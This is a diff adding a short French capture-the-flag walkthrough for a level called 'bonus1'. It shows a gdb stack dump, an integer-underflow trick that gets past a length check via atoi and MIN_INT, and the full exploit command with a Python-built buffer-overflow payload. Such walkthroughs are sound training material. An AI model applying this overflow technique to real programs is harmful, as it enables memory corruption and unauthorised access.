@@ -1,0 +1,20 @@
+# Apres observation on voit que le numero de atoi est stocke 4 bytes apres la fin de notre buffer de 36.
+
+(gdb) x/32x $esp + 0x14 // buffer
+0xbffff6c4:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff6d4:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff6e4:     0x42424242      0x080484b9      0x00000009      0x080484b0
+0xbffff6f4:     0x00000000      0x00000000      0xb7e454d3      0x00000003
+0xbffff704:     0xbffff794      0xbffff7a4      0xb7fdc858      0x00000000
+0xbffff714:     0xbffff71c      0xbffff7a4      0x00000000      0x0804821c
+0xbffff724:     0xb7fd0ff4      0x00000000      0x00000000      0x00000000
+0xbffff734:     0x18dddc19      0x2f9af809      0x00000000      0x00000000
+
+# On va chercher a faire un underflow pour l'instrucion 'lea [esp+0x3c * 4]'.
+# En effet si on met MIN_INT - 1, le resultat de l'opperation sera 4, si MIN_INT - 2 = 8 etc...
+
+# Donc on sait que notre numero est stocke a esp + 40, on va y ecrire 'WOLF' (0x574f4c46)
+
+./bonus1 `expr -2147483648 + 11` `python -c 'print("B" * 40 + "FLOW")'`
+
+# 11 * 4 = 44.
